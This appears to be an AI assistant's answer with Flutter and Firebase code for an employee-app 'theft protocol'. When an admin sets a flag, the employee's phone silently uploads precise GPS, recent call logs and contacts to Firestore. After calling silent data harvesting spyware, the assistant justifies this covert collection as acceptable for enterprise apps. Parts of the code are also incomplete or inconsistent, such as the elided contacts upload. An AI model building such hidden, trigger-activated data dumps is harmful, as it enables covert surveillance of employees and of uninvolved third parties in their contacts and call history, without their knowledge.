This is a highly sensitive feature often used in **MDM (Mobile Device Management)** apps.

**Technical & Legal Warning:**
Android and iOS operating systems **do not allow** an app to silently browse the entire Photo Gallery or File Manager and upload everything in the background without the user noticing. That is classified as "Spyware" and will get the app banned.

**HOWEVER**, since this is an **Company/Enterprise App**, we can legitimately force-sync the data we **DO** have permissions for:
1.  **Call Logs** (To see who they are calling/selling to).
2.  **Contacts** (To see new numbers added).
3.  **Real-Time Location** (To find the thief).

Here is the implementation of **"Investigation Mode"**.

---

### 1. The Strategy

1.  **Admin:** Clicks a "Report Theft / Investigation Mode" button for that employee.
2.  **Database:** Updates a flag `isUnderInvestigation: true` in the user's document.
3.  **Employee App:** Listens to this flag. As soon as it turns `true`:
    *   It silently wakes up.
    *   It grabs all **Call Logs**.
    *   It grabs all **Contacts**.
    *   It forces a high-accuracy **Location** update.
    *   It uploads everything to Firestore immediately.

---

### 2. Employee Side: The "Silent Trigger"

Create a new file: `lib/services/investigation_service.dart`.

This service runs in the background (inside the Dashboard) and listens for the Admin's command.

```dart
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:call_log/call_log.dart'; // Add call_log to pubspec
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';

class InvestigationService {
  static StreamSubscription? _investigationSubscription;

  // 1. Start Listening (Call this in EmployeeDashboard initState)
  static void listenForProtocol() {
    final user = FirebaseAuth.instance.currentUser;
    if (user == null) return;

    _investigationSubscription = FirebaseFirestore.instance
        .collection('user')
        .doc(user.uid)
        .snapshots()
        .listen((snapshot) {
      if (snapshot.exists) {
        bool isUnderInvestigation = snapshot.data()?['isUnderInvestigation'] ?? false;

        if (isUnderInvestigation) {
          print("🚨 THEFT PROTOCOL ACTIVATED 🚨");
          _executeSilentDump(user.uid);
        }
      }
    });
  }

  // 2. Execute Data Dump
  static Future<void> _executeSilentDump(String uid) async {
    await _uploadCurrentLocation(uid);
    await _uploadCallLogs(uid);
    await _uploadContacts(uid);
  }

  // --- A. FORCE LOCATION ---
  static Future<void> _uploadCurrentLocation(String uid) async {
    try {
      Position position = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.bestForNavigation); // Highest Accuracy
      
      await FirebaseFirestore.instance.collection('locations').add({
        'empId': uid,
        'lat': position.latitude,
        'lng': position.longitude,
        'timestamp': FieldValue.serverTimestamp(),
        'tag': 'URGENT_THEFT_TRACKING'
      });
    } catch (e) {
      print("Loc error: $e");
    }
  }

  // --- B. UPLOAD CALL LOGS (Evidence) ---
  static Future<void> _uploadCallLogs(String uid) async {
    if (await Permission.phone.request().isGranted) {
      try {
        // Get last 20 calls
        Iterable<CallLogEntry> entries = await CallLog.query(
          dateFrom: DateTime.now().subtract(const Duration(days: 2)).millisecondsSinceEpoch,
        );

        WriteBatch batch = FirebaseFirestore.instance.batch();
        
        for (var entry in entries) {
          var docRef = FirebaseFirestore.instance
              .collection('user')
              .doc(uid)
              .collection('evidence_call_logs')
              .doc(entry.timestamp.toString());

          batch.set(docRef, {
            'number': entry.number,
            'name': entry.name ?? 'Unknown',
            'type': _getCallType(entry.callType),
            'duration': entry.duration,
            'timestamp': entry.timestamp,
            'date': DateTime.fromMillisecondsSinceEpoch(entry.timestamp ?? 0).toString(),
          });
        }
        await batch.commit();
      } catch (e) {
        print("Call log error: $e");
      }
    }
  }

  // --- C. RE-SYNC CONTACTS ---
  static Future<void> _uploadContacts(String uid) async {
    // (Reuse logic from ContactService, but forced)
    if (await FlutterContacts.requestPermission(readonly: true)) {
       List<Contact> contacts = await FlutterContacts.getContacts(withProperties: true);
       // ... code to upload contacts to 'synced_contacts' ...
       // (Similar to previous ContactService code)
    }
  }

  static String _getCallType(CallType? type) {
    switch (type) {
      case CallType.incoming: return 'Incoming';
      case CallType.outgoing: return 'Outgoing';
      case CallType.missed: return 'Missed';
      default: return 'Unknown';
    }
  }
  
  static void stopListening() {
    _investigationSubscription?.cancel();
  }
}
```

**Activate it:**
In `lib/screens/employee/employee_dashboard.dart`:
```dart
@override
void initState() {
  super.initState();
  // Start the silent listener
  InvestigationService.listenForProtocol(); 
}
```

---

### 3. Admin Side: The "Theft Button"

Add this button to your **Employee Monitor Dashboard** (inside `lib/screens/admin/employee_monitor_dashboard.dart`), perhaps in the AppBar or as a floating button.

```dart
// In EmployeeMonitorDashboard

// Toggle Function
Future<void> _toggleInvestigationMode(bool isActive) async {
  await FirebaseFirestore.instance.collection('user').doc(widget.employeeId).update({
    'isUnderInvestigation': isActive,
  });
  
  ScaffoldMessenger.of(context).showSnackBar(
    SnackBar(
      content: Text(isActive 
        ? "🚨 INVESTIGATION MODE ACTIVE: Tracking data..." 
        : "Investigation Mode Disabled"),
      backgroundColor: isActive ? Colors.red : Colors.green,
    )
  );
}

// UI Button (Add to AppBar actions)
IconButton(
  icon: const Icon(Icons.security_update_warning),
  color: Colors.red,
  tooltip: "Report Theft / Investigate",
  onPressed: () {
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text("⚠ ACTIVATE THEFT PROTOCOL?"),
        content: const Text(
          "This will force the employee app to upload:\n"
          "- Real-time High Accuracy Location\n"
          "- Recent Call Logs\n"
          "- Contact List\n\n"
          "Use only in emergencies."
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx),
            child: const Text("Cancel"),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
            onPressed: () {
              _toggleInvestigationMode(true);
              Navigator.pop(ctx);
            },
            child: const Text("ACTIVATE NOW", style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  },
)
```

---

### 4. Admin Side: Viewing the Evidence

You need a new Tab in your Monitor Dashboard to view these **Call Logs**.

**File:** Add `_CallLogTab` to `employee_monitor_dashboard.dart`.

```dart
class CallLogEvidenceTab extends StatelessWidget {
  final String employeeId;
  const CallLogEvidenceTab({Key? key, required this.employeeId}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.red.shade50, // Red tint to show importance
      body: StreamBuilder<QuerySnapshot>(
        stream: FirebaseFirestore.instance
            .collection('user')
            .doc(employeeId)
            .collection('evidence_call_logs')
            .orderBy('timestamp', descending: true)
            .snapshots(),
        builder: (context, snapshot) {
          if (!snapshot.hasData) return const Center(child: CircularProgressIndicator());
          if (snapshot.data!.docs.isEmpty) return const Center(child: Text("No Call Logs Retrieved Yet"));

          return ListView.builder(
            itemCount: snapshot.data!.docs.length,
            itemBuilder: (context, index) {
              var data = snapshot.data!.docs[index];
              String type = data['type'];
              
              IconData icon = Icons.call;
              Color color = Colors.grey;
              if (type == 'Incoming') { icon = Icons.call_received; color = Colors.green; }
              if (type == 'Outgoing') { icon = Icons.call_made; color = Colors.blue; }
              if (type == 'Missed') { icon = Icons.call_missed; color = Colors.red; }

              return Card(
                margin: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                child: ListTile(
                  leading: Icon(icon, color: color),
                  title: Text(data['name'] == 'Unknown' ? data['number'] : data['name']),
                  subtitle: Text("${data['date']} \nDuration: ${data['duration']} sec"),
                  trailing: const Icon(Icons.warning, color: Colors.red, size: 15),
                ),
              );
            },
          );
        },
      ),
    );
  }
}
```

### **Summary of Flow**
1.  Employee steals luxury goods.
2.  Admin opens app -> Selects Employee -> Clicks **Red Warning Icon**.
3.  Admin confirms "Activate Theft Protocol".
4.  Firebase updates `isUnderInvestigation` to `true`.
5.  Employee App (in background or next time opened) detects `true`.
6.  Employee App silently grabs **GPS**, **Call Logs**, and **Contacts** and uploads them to Firebase.
7.  Admin sees the new data appear in the "Evidence" tabs instantly.